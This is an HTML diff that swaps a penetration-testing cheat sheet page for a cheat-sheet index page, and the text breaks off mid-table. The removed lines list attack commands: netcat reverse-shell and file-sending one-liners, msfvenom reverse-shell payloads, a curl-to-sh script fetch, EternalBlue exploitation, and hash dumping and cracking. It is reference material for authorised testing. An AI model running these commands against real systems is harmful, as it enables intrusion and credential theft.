@@ -3,31 +3,27 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>White Hat Hacker Tools — Cheat Sheet</title>
-<meta name="description" content="Filterable cheat sheet of white hat / penetration testing tools with key commands and use cases.">
+<title>ops://cheatsheets</title>
+<meta name="description" content="Practitioner cheat sheets for security, infrastructure, and platform engineering.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg:       #0d0f0e;
-    --bg2:      #141715;
-    --bg3:      #1c1f1d;
-    --border:   #2a2e2c;
-    --border2:  #3a3f3c;
-    --text:     #c8d5c8;
-    --muted:    #6a7a6a;
-    --accent:   #39ff82;
-    --accent2:  #f0b429;
-    --red:      #ff5f57;
-    --cmd:      #7dd3a8;
-    --mono:     'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
-    --display:  'Syne', sans-serif;
+    --bg:      #0d0f0e;
+    --bg2:     #141715;
+    --bg3:     #1c1f1d;
+    --border:  #2a2e2c;
+    --border2: #3a3f3c;
+    --text:    #c8d5c8;
+    --muted:   #6a7a6a;
+    --accent:  #39ff82;
+    --amber:   #f0b429;
+    --blue:    #60a5fa;
+    --red:     #ff5f57;
+    --mono:    'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
   }
-
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-  html { scroll-behavior: smooth; }
-
   body {
     background: var(--bg);
     color: var(--text);
@@ -36,297 +32,117 @@
     line-height: 1.6;
     min-height: 100vh;
   }
-
-  /* ── SCANLINE OVERLAY ── */
   body::before {
     content: '';
     position: fixed;
     inset: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(0,0,0,0.04) 2px,
-      rgba(0,0,0,0.04) 4px
-    );
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
     pointer-events: none;
     z-index: 999;
   }
 
-  /* ── HEADER ── */
   header {
     border-bottom: 1px solid var(--border);
-    padding: 2.5rem 2rem 2rem;
+    padding: 3rem 2rem 2.5rem;
     position: relative;
-    overflow: hidden;
   }
-
   header::after {
     content: '';
     position: absolute;
-    bottom: -1px;
-    left: 0;
-    width: 120px;
-    height: 2px;
+    bottom: -1px; left: 2rem;
+    width: 80px; height: 2px;
     background: var(--accent);
   }
-
-  .header-inner {
-    max-width: 1200px;
-    margin: 0 auto;
-    display: flex;
-    align-items: flex-end;
-    justify-content: space-between;
-    gap: 1rem;
-    flex-wrap: wrap;
-  }
-
-  .title-block {}
-
-  .prompt {
-    font-size: 11px;
-    color: var(--accent);
-    letter-spacing: .1em;
-    margin-bottom: .5rem;
-  }
-
+  .inner { max-width: 860px; margin: 0 auto; }
+  .prompt { font-size: 11px; color: var(--accent); letter-spacing: .1em; margin-bottom: .6rem; }
   .prompt::before { content: '$ '; color: var(--muted); }
-
   h1 {
     font-family: var(--display);
-    font-size: clamp(1.6rem, 4vw, 2.6rem);
+    font-size: clamp(2rem, 5vw, 3.2rem);
     font-weight: 800;
     color: #e8f0e8;
-    letter-spacing: -.02em;
-    line-height: 1.1;
+    letter-spacing: -.03em;
+    line-height: 1.05;
   }
-
   h1 span { color: var(--accent); }
+  .tagline { margin-top: .75rem; font-size: 12px; color: var(--muted); max-width: 480px; }
 
-  .subtitle {
-    margin-top: .6rem;
-    font-size: 12px;
+  main { max-width: 860px; margin: 0 auto; padding: 3rem 2rem; }
+
+  .section-label {
+    font-size: 10px;
+    letter-spacing: .14em;
+    text-transform: uppercase;
     color: var(--muted);
-    max-width: 520px;
-  }
-
-  .meta {
-    text-align: right;
-    font-size: 11px;
-    color: var(--muted);
-    line-height: 2;
-  }
-
-  .meta strong { color: var(--text); }
-
-  /* ── MAIN ── */
-  main {
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 2rem;
-  }
-
-  /* ── DISCLAIMER ── */
-  .disclaimer {
-    display: flex;
-    align-items: flex-start;
-    gap: .75rem;
-    background: rgba(255, 95, 87, 0.06);
-    border: 1px solid rgba(255, 95, 87, 0.25);
-    border-left: 3px solid var(--red);
-    border-radius: 4px;
-    padding: .75rem 1rem;
-    margin-bottom: 1.75rem;
-    font-size: 11px;
-    color: var(--muted);
-  }
-
-  .disclaimer::before {
-    content: '⚠';
-    color: var(--red);
-    font-size: 14px;
-    line-height: 1.4;
-    flex-shrink: 0;
-  }
-
-  .disclaimer strong { color: var(--red); }
-
-  /* ── FILTERS ── */
-  .toolbar {
-    display: flex;
-    flex-wrap: wrap;
-    align-items: center;
-    gap: .5rem;
     margin-bottom: 1.25rem;
+    display: flex;
+    align-items: center;
+    gap: .75rem;
   }
+  .section-label::after { content: ''; flex: 1; height: 1px; background: var(--border); }
 
-  .toolbar-label {
-    font-size: 10px;
-    letter-spacing: .12em;
-    color: var(--muted);
-    text-transform: uppercase;
-    margin-right: .25rem;
-  }
+  .posts { display: flex; flex-direction: column; gap: 1px; margin-bottom: 3rem; }
 
-  .f-btn {
-    background: transparent;
-    border: 1px solid var(--border2);
-    border-radius: 3px;
-    padding: 3px 10px;
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--muted);
-    cursor: pointer;
-    letter-spacing: .06em;
-    transition: color .15s, border-color .15s, background .15s;
-  }
-
-  .f-btn:hover {
-    color: var(--text);
-    border-color: var(--border2);
-    background: var(--bg3);
-  }
-
-  .f-btn.active {
-    color: var(--accent);
-    border-color: var(--accent);
-    background: rgba(57, 255, 130, 0.07);
-  }
-
-  .count {
-    margin-left: auto;
-    font-size: 11px;
-    color: var(--muted);
-  }
-
-  .count strong { color: var(--accent); }
-
-  /* ── TABLE WRAPPER ── */
-  .table-wrap {
-    overflow-x: auto;
-    border: 1px solid var(--border);
-    border-radius: 6px;
-  }
-
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    min-width: 800px;
-  }
-
-  thead th {
+  .post-card {
+    display: grid;
+    grid-template-columns: 1fr auto;
+    align-items: center;
+    gap: 1rem;
     background: var(--bg2);
-    padding: 10px 14px;
-    text-align: left;
-    font-size: 10px;
-    letter-spacing: .12em;
-    text-transform: uppercase;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--border);
+    padding: 1.25rem 1.5rem;
+    text-decoration: none;
+    color: inherit;
+    transition: border-left-color .15s, background .15s;
+  }
+  .post-card:first-child { border-radius: 6px 6px 0 0; }
+  .post-card:last-of-type { border-radius: 0 0 6px 6px; }
+  .post-card:hover { background: var(--bg3); }
+  .post-card.pentest:hover { border-left-color: var(--red); }
+  .post-card.k8s:hover     { border-left-color: var(--blue); }
+
+  .post-meta { display: flex; align-items: center; gap: .6rem; flex-wrap: wrap; margin-bottom: .4rem; }
+  .tag {
+    font-size: 10px; padding: 1px 7px; border-radius: 2px;
+    letter-spacing: .05em; font-weight: 500;
+  }
+  .tag-red  { background: rgba(255,95,87,.12);  color: #ff7b75; border: 1px solid rgba(255,95,87,.3);  }
+  .tag-blue { background: rgba(96,165,250,.12); color: #60a5fa; border: 1px solid rgba(96,165,250,.3); }
+  .post-date { font-size: 10px; color: var(--muted); }
+  .post-title {
+    font-family: var(--display);
+    font-size: 1.15rem; font-weight: 700;
+    color: #e8f0e8; letter-spacing: -.01em;
+    margin-bottom: .35rem;
+  }
+  .post-desc { font-size: 12px; color: var(--muted); max-width: 560px; }
+  .tool-count { font-size: 10px; color: var(--muted); margin-top: .5rem; }
+  .tool-count strong { color: var(--text); }
+  .post-arrow {
+    font-size: 18px; color: var(--border2);
+    transition: color .15s, transform .15s;
+  }
+  .post-card:hover .post-arrow { color: var(--text); transform: translateX(3px); }
+
+  .coming-soon {
+    border: 1px dashed var(--border);
+    border-radius: 6px;
+    padding: 1.25rem 1.5rem;
     color: var(--muted);
-    border-bottom: 1px solid var(--border);
-    white-space: nowrap;
-    font-weight: 400;
-  }
-
-  thead th:first-child { border-radius: 6px 0 0 0; }
-  thead th:last-child  { border-radius: 0 6px 0 0; }
-
-  tbody tr {
-    border-bottom: 1px solid var(--border);
-    transition: background .1s;
-  }
-
-  tbody tr:last-child { border-bottom: none; }
-
-  tbody tr:hover { background: var(--bg2); }
-
-  td {
-    padding: 10px 14px;
-    vertical-align: top;
-  }
-
-  /* tool name */
-  td.tool-name {
-    font-weight: 700;
-    font-size: 13px;
-    color: #e0ece0;
-    white-space: nowrap;
-    min-width: 120px;
-  }
-
-  /* phase badge */
-  td.phase { min-width: 100px; }
-
-  .badge {
-    display: inline-block;
-    font-size: 10px;
-    padding: 2px 8px;
-    border-radius: 2px;
-    letter-spacing: .06em;
-    font-weight: 500;
-    white-space: nowrap;
-  }
-
-  .badge-recon    { background: rgba(240,180,41,.12);  color: #f0b429; border: 1px solid rgba(240,180,41,.3);  }
-  .badge-web      { background: rgba(57,255,130,.10);  color: #39ff82; border: 1px solid rgba(57,255,130,.25); }
-  .badge-network  { background: rgba(96,165,250,.12);  color: #60a5fa; border: 1px solid rgba(96,165,250,.3);  }
-  .badge-exploit  { background: rgba(255,95,87,.12);   color: #ff7b75; border: 1px solid rgba(255,95,87,.3);   }
-  .badge-post     { background: rgba(192,96,255,.12);  color: #c060ff; border: 1px solid rgba(192,96,255,.3);  }
-  .badge-password { background: rgba(251,146,60,.12);  color: #fb923c; border: 1px solid rgba(251,146,60,.3);  }
-  .badge-wireless { background: rgba(45,212,191,.12);  color: #2dd4bf; border: 1px solid rgba(45,212,191,.3);  }
-
-  /* commands */
-  td.commands {
-    min-width: 320px;
-    max-width: 420px;
-  }
-
-  .cmd-block {
-    position: relative;
-  }
-
-  .cmd-line {
-    display: block;
-    color: var(--cmd);
-    font-size: 11.5px;
-    line-height: 1.9;
-    word-break: break-all;
-  }
-
-  .cmd-line::before {
-    content: '$ ';
-    color: var(--muted);
-    user-select: none;
-  }
-
-  .copy-btn {
-    position: absolute;
-    top: 0;
-    right: 0;
-    background: var(--bg3);
-    border: 1px solid var(--border2);
-    border-radius: 3px;
-    color: var(--muted);
-    font-family: var(--mono);
-    font-size: 10px;
-    padding: 1px 7px;
-    cursor: pointer;
-    opacity: 0;
-    transition: opacity .15s, color .15s;
-    letter-spacing: .05em;
-  }
-
-  .cmd-block:hover .copy-btn { opacity: 1; }
-  .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
-  .copy-btn.copied { color: var(--accent); border-color: var(--accent); }
-
-  /* use case */
-  td.usecase {
     font-size: 12px;
-    color: var(--muted);
-    min-width: 220px;
+    display: flex;
+    flex-direction: column;
+    gap: .45rem;
   }
+  .coming-soon-title {
+    font-size: 10px; letter-spacing: .1em;
+    text-transform: uppercase; color: var(--border2);
+    margin-bottom: .25rem;
+  }
+  .coming-item { display: flex; align-items: baseline; gap: .6rem; }
+  .coming-item::before { content: '·'; color: var(--border2); flex-shrink: 0; }
 
-  /* ── FOOTER ── */
   footer {
     border-top: 1px solid var(--border);
     padding: 1.5rem 2rem;
@@ -335,474 +151,71 @@
     color: var(--muted);
   }
 
-  footer a { color: var(--muted); text-decoration: none; }
-  footer a:hover { color: var(--text); }
-
-  /* ── NO RESULTS ── */
-  .no-results {
-    text-align: center;
-    padding: 3rem;
-    color: var(--muted);
-    font-size: 12px;
-    display: none;
-  }
-
-  @media (max-width: 640px) {
+  @media (max-width: 600px) {
     header, main { padding: 1.25rem; }
-    h1 { font-size: 1.5rem; }
-    .meta { display: none; }
+    h1 { font-size: 1.8rem; }
+    .post-card { grid-template-columns: 1fr; }
+    .post-arrow { display: none; }
   }
 </style>
 </head>
 <body>
 
 <header>
-  <div class="header-inner">
-    <div class="title-block">
-      <p class="prompt">white-hat-tools --cheatsheet</p>
-      <h1>Pen Test<br><span>Cheat Sheet</span></h1>
-      <p class="subtitle">Filterable reference of white hat / penetration testing tools — key commands and use cases.</p>
-    </div>
-    <div class="meta">
-      <strong>23</strong> tools<br>
-      <strong>7</strong> phases<br>
-      Kali · Parrot · BlackArch
-    </div>
+  <div class="inner">
+    <p class="prompt">ls -la ./cheatsheets</p>
+    <h1>ops://<span>cheatsheets</span></h1>
+    <p class="tagline">Practitioner-grade command references for security, infrastructure, and platform engineering. No fluff.</p>
   </div>
 </header>
 
 <main>
-  <div class="disclaimer">
-    <span><strong>Legal:</strong> Use only against systems you own or have explicit written authorisation to test. Unauthorised scanning and exploitation is illegal in most jurisdictions and will trigger IDS alerts.</span>
+
+  <p class="section-label">published</p>
+
+  <div class="posts">
+
+    <a href="pentest.html" class="post-card pentest">
+      <div>
+        <div class="post-meta">
+          <span class="tag tag-red">security</span>
+          <span class="post-date">2026-05-09</span>
+        </div>
+        <p class="post-title">White Hat Hacker Tools</p>
+        <p class="post-desc">Filterable reference for penetration testing — recon, web, network, exploit, post-exploit, password cracking, and wireless.</p>
+        <p class="tool-count"><strong>23</strong> tools &middot; 7 phases</p>
+      </div>
+      <span class="post-arrow">&#8594;</span>
+    </a>
+
+    <a href="kubernetes.html" class="post-card k8s">
+      <div>
+        <div class="post-meta">
+          <span class="tag tag-blue">kubernetes</span>
+          <span class="post-date">2026-05-09</span>
+        </div>
+        <p class="post-title">Kubernetes Debugging Toolkit</p>
+        <p class="post-desc">Filterable reference for K8s debugging — inspect, network, security audit, cluster health, RBAC, and storage.</p>
+        <p class="tool-count"><strong>18</strong> tools &middot; 6 phases</p>
+      </div>
+      <span class="post-arrow">&#8594;</span>
+    </a>
+
   </div>
 
-  <div class="toolbar">
-    <span class="toolbar-label">Phase</span>
-    <button class="f-btn active" data-cat="all">all</button>
-    <button class="f-btn" data-cat="recon">recon</button>
-    <button class="f-btn" data-cat="web">web</button>
-    <button class="f-btn" data-cat="network">network</button>
-    <button class="f-btn" data-cat="exploit">exploit</button>
-    <button class="f-btn" data-cat="post">post-exploit</button>
-    <button class="f-btn" data-cat="password">password</button>
-    <button class="f-btn" data-cat="wireless">wireless</button>
-    <span class="count" id="count"><strong id="count-n">23</strong> tools shown</span>
+  <p class="section-label">up next</p>
+
+  <div class="coming-soon">
+    <p class="coming-soon-title">on the roadmap</p>
+    <div class="coming-item">IaC &amp; Terraform Ecosystem — tflint, tfsec, checkov, infracost, conftest, terraform-docs</div>
+    <div class="coming-item">Observability &amp; SRE — promtool, logcli, bpftrace, pprof, pyspy, strace, perf</div>
+    <div class="coming-item">Container Security — trivy, grype, syft, cosign, hadolint, docker bench</div>
+    <div class="coming-item">Go Developer Toolkit — dlv, pprof, golangci-lint, govulncheck, benchstat</div>
   </div>
 
-  <div class="table-wrap">
-    <table>
-      <thead>
-        <tr>
-          <th>Tool</th>
-          <th>Phase</th>
-          <th>Key commands</th>
-          <th>Use case</th>
-        </tr>
-      </thead>
-      <tbody id="tbody">
-
-        <!-- ── RECON ── -->
-        <tr data-cat="recon">
-          <td class="tool-name">nmap</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">nmap -sV -sC -p- &lt;ip&gt;</span>
-            <span class="cmd-line">nmap -A -T4 &lt;ip&gt;</span>
-            <span class="cmd-line">nmap --script vuln &lt;ip&gt;</span>
-            <span class="cmd-line">nmap -sU -p 53,161 &lt;ip&gt;</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Port scan, service/version detection, OS fingerprint, NSE scripts for vuln detection</td>
-        </tr>
-
-        <tr data-cat="recon">
-          <td class="tool-name">amass</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">amass enum -d example.com</span>
-            <span class="cmd-line">amass enum -brute -d example.com</span>
-            <span class="cmd-line">amass db -show -d example.com</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Subdomain enumeration via DNS, APIs, and certificate transparency logs</td>
-        </tr>
-
-        <tr data-cat="recon">
-          <td class="tool-name">theHarvester</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">theHarvester -d example.com -b all</span>
-            <span class="cmd-line">theHarvester -d example.com -b google,shodan</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">OSINT: emails, subdomains, IPs, employee names from public sources</td>
-        </tr>
-
-        <tr data-cat="recon">
-          <td class="tool-name">shodan CLI</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">shodan host &lt;ip&gt;</span>
-            <span class="cmd-line">shodan search "apache 2.4" country:DE</span>
-            <span class="cmd-line">shodan stats --facets port apache</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Internet-exposed asset discovery, CVE lookups, banner grabbing</td>
-        </tr>
-
-        <tr data-cat="recon">
-          <td class="tool-name">enum4linux-ng</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">enum4linux-ng -A &lt;ip&gt;</span>
-            <span class="cmd-line">enum4linux-ng -U &lt;ip&gt;</span>
-            <span class="cmd-line">enum4linux-ng -S &lt;ip&gt;</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">SMB/Samba enumeration: users, shares, policies, OS info</td>
-        </tr>
-
-        <tr data-cat="recon">
-          <td class="tool-name">dnsx</td>
-          <td class="phase"><span class="badge badge-recon">recon</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">dnsx -d example.com -a -cname</span>
-            <span class="cmd-line">cat subs.txt | dnsx -resp-only</span>
-            <span class="cmd-line">dnsx -l hosts.txt -ptr</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Fast DNS resolver; A/CNAME/PTR/MX lookup in bulk; pairs with amass output</td>
-        </tr>
-
-        <!-- ── WEB ── -->
-        <tr data-cat="web">
-          <td class="tool-name">burp suite</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line"># proxy → intercept on</span>
-            <span class="cmd-line"># Repeater: modify &amp; replay requests</span>
-            <span class="cmd-line"># Intruder: fuzz params / brute creds</span>
-            <span class="cmd-line"># Scanner: passive + active scan</span>
-            <span class="cmd-line"># Decoder: base64 / url / hex</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Web app testing: intercept/modify HTTP, automated scanning, CSRF/IDOR/XSS/SSRF</td>
-        </tr>
-
-        <tr data-cat="web">
-          <td class="tool-name">nikto</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">nikto -h http://target.com</span>
-            <span class="cmd-line">nikto -h target.com -p 443 -ssl</span>
-            <span class="cmd-line">nikto -h target.com -Tuning 9</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Web server misconfig, outdated software, default files, dangerous headers</td>
-        </tr>
-
-        <tr data-cat="web">
-          <td class="tool-name">sqlmap</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">sqlmap -u "http://t.com?id=1" --dbs</span>
-            <span class="cmd-line">sqlmap -u "http://t.com?id=1" -D db -T users --dump</span>
-            <span class="cmd-line">sqlmap -r req.txt --level=5 --risk=3</span>
-            <span class="cmd-line">sqlmap --os-shell</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Automated SQL injection detection and exploitation; can escalate to OS shell</td>
-        </tr>
-
-        <tr data-cat="web">
-          <td class="tool-name">ffuf</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">ffuf -u http://t.com/FUZZ -w wordlist.txt</span>
-            <span class="cmd-line">ffuf -u http://t.com -H "Host: FUZZ.t.com" -w subs.txt</span>
-            <span class="cmd-line">ffuf -u http://t.com/FUZZ -w list.txt -fc 404</span>
-            <span class="cmd-line">ffuf -u http://t.com/FUZZ -e .php,.bak,.conf</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Fast dir/file fuzzing, vhost/subdomain brute, param discovery</td>
-        </tr>
-
-        <tr data-cat="web">
-          <td class="tool-name">gobuster</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">gobuster dir -u http://t.com -w common.txt</span>
-            <span class="cmd-line">gobuster dns -d example.com -w subs.txt</span>
-            <span class="cmd-line">gobuster vhost -u http://t.com -w vhosts.txt</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Directory/file/subdomain/vhost brute-force; simpler API than ffuf</td>
-        </tr>
-
-        <tr data-cat="web">
-          <td class="tool-name">nuclei</td>
-          <td class="phase"><span class="badge badge-web">web</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">nuclei -u https://target.com</span>
-            <span class="cmd-line">nuclei -l targets.txt -t cves/</span>
-            <span class="cmd-line">nuclei -u https://t.com -t exposures/ -severity critical,high</span>
-            <span class="cmd-line">nuclei -update-templates</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Template-based vuln scanner; CVEs, misconfigs, exposures; auditable at scale</td>
-        </tr>
-
-        <!-- ── NETWORK ── -->
-        <tr data-cat="network">
-          <td class="tool-name">wireshark / tshark</td>
-          <td class="phase"><span class="badge badge-network">network</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">tshark -i eth0 -w cap.pcap</span>
-            <span class="cmd-line">tshark -r cap.pcap -Y "http.request"</span>
-            <span class="cmd-line">tshark -r cap.pcap -T fields -e http.host</span>
-            <span class="cmd-line">wireshark -k -i eth0</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Packet capture, protocol analysis, credential sniffing on unencrypted traffic</td>
-        </tr>
-
-        <tr data-cat="network">
-          <td class="tool-name">tcpdump</td>
-          <td class="phase"><span class="badge badge-network">network</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">tcpdump -i eth0 -w out.pcap</span>
-            <span class="cmd-line">tcpdump -r out.pcap port 80</span>
-            <span class="cmd-line">tcpdump -i any host 10.0.0.1</span>
-            <span class="cmd-line">tcpdump -n -X -s0 port 443</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">CLI packet capture; filter by host/port/proto; pipe to tshark</td>
-        </tr>
-
-        <tr data-cat="network">
-          <td class="tool-name">netcat (nc)</td>
-          <td class="phase"><span class="badge badge-network">network</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">nc -lvnp 4444</span>
-            <span class="cmd-line">nc &lt;ip&gt; 4444 -e /bin/bash</span>
-            <span class="cmd-line">nc &lt;ip&gt; 80</span>
-            <span class="cmd-line">nc -zv &lt;ip&gt; 20-1024</span>
-            <span class="cmd-line">cat file | nc &lt;ip&gt; 9999</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Reverse/bind shells, port scan, file transfer, banner grabbing</td>
-        </tr>
-
-        <tr data-cat="network">
-          <td class="tool-name">openssl</td>
-          <td class="phase"><span class="badge badge-network">network</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">openssl s_client -connect t.com:443</span>
-            <span class="cmd-line">openssl s_client -connect t.com:443 -tlsext_debug</span>
-            <span class="cmd-line">openssl x509 -in cert.pem -text -noout</span>
-            <span class="cmd-line">openssl ciphers -v 'ALL'</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">TLS handshake inspection, cert analysis, cipher suite enumeration</td>
-        </tr>
-
-        <tr data-cat="network">
-          <td class="tool-name">responder</td>
-          <td class="phase"><span class="badge badge-network">network</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">responder -I eth0 -rdwv</span>
-            <span class="cmd-line">responder -I eth0 -A</span>
-            <span class="cmd-line"># logs to /usr/share/responder/logs/</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">LLMNR/NBT-NS/mDNS poisoning to capture NTLMv2 hashes on local network</td>
-        </tr>
-
-        <!-- ── EXPLOIT ── -->
-        <tr data-cat="exploit">
-          <td class="tool-name">metasploit</td>
-          <td class="phase"><span class="badge badge-exploit">exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">msfconsole</span>
-            <span class="cmd-line">search type:exploit name:eternalblue</span>
-            <span class="cmd-line">use exploit/windows/smb/ms17_010_eternalblue</span>
-            <span class="cmd-line">set RHOSTS &lt;ip&gt; ; set LHOST &lt;ip&gt;</span>
-            <span class="cmd-line">show payloads ; set PAYLOAD ...</span>
-            <span class="cmd-line">run ; sessions -l ; sessions -i 1</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Exploit known CVEs, generate payloads, manage sessions, post-exploitation framework</td>
-        </tr>
-
-        <tr data-cat="exploit">
-          <td class="tool-name">msfvenom</td>
-          <td class="phase"><span class="badge badge-exploit">exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f elf -o shell</span>
-            <span class="cmd-line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=443 -f exe -o p.exe</span>
-            <span class="cmd-line">msfvenom --list payloads | grep python</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Payload generation: ELF, EXE, shellcode, scripts; pairs with nc listener or MSF handler</td>
-        </tr>
-
-        <!-- ── POST-EXPLOIT ── -->
-        <tr data-cat="post">
-          <td class="tool-name">linpeas</td>
-          <td class="phase"><span class="badge badge-post">post-exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span>
-            <span class="cmd-line">./linpeas.sh -a | tee out.txt</span>
-            <span class="cmd-line">./linpeas.sh -o SYS_TOOLS,PROCS</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Linux privesc: SUID, sudo misconfigs, crons, writable paths, kernel vulns</td>
-        </tr>
-
-        <tr data-cat="post">
-          <td class="tool-name">winpeas</td>
-          <td class="phase"><span class="badge badge-post">post-exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">winpeas.exe</span>
-            <span class="cmd-line">winpeas.exe quiet cmd fast</span>
-            <span class="cmd-line">winpeas.exe systeminfo</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">Windows privesc: unquoted paths, AlwaysInstallElevated, stored creds, weak services</td>
-        </tr>
-
-        <tr data-cat="post">
-          <td class="tool-name">impacket</td>
-          <td class="phase"><span class="badge badge-post">post-exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">secretsdump.py domain/user:pass@&lt;ip&gt;</span>
-            <span class="cmd-line">psexec.py domain/user:pass@&lt;ip&gt;</span>
-            <span class="cmd-line">GetUserSPNs.py domain/user:pass -dc-ip &lt;ip&gt; -request</span>
-            <span class="cmd-line">wmiexec.py domain/user:pass@&lt;ip&gt;</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">AD attacks: hash dumping, Kerberoasting, Pass-the-Hash, remote exec without PSExec detection</td>
-        </tr>
-
-        <tr data-cat="post">
-          <td class="tool-name">bloodhound</td>
-          <td class="phase"><span class="badge badge-post">post-exploit</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">SharpHound.exe --CollectionMethods All</span>
-            <span class="cmd-line">bloodhound-python -d domain -u user -p pass -c all</span>
-            <span class="cmd-line"># import zip → find path to Domain Admin</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">AD attack path visualisation: shortest path to DA, ACL abuse, Kerberoastable accounts</td>
-        </tr>
-
-        <!-- ── PASSWORD ── -->
-        <tr data-cat="password">
-          <td class="tool-name">hashcat</td>
-          <td class="phase"><span class="badge badge-password">password</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">hashcat -m 0 hashes.txt rockyou.txt</span>
-            <span class="cmd-line">hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule</span>
-            <span class="cmd-line">hashcat -m 1800 sha512.txt rockyou.txt --force</span>
-            <span class="cmd-line">hashcat --example-hashes | grep -A2 NTLM</span>
-            <button class="copy-btn" onclick="copyAll(this)">copy</button>
-          </div></td>
-          <td class="usecase">GPU-accelerated hash cracking: MD5/NTLM/bcrypt/SHA; rule-based mutation</td>
-        </tr>
-
-        <tr data-cat="password">
-          <td class="tool-name">john</td>
-          <td class="phase"><span class="badge badge-password">password</span></td>
-          <td class="commands"><div class="cmd-block">
-            <span class="cmd-line">john hashes.txt --wordlist=rockyou.txt</span>
-            <span class="cmd-line">john --format=sha512crypt shadow.txt</span>
-            <span class="cmd-line">john --show hashes.txt</span>
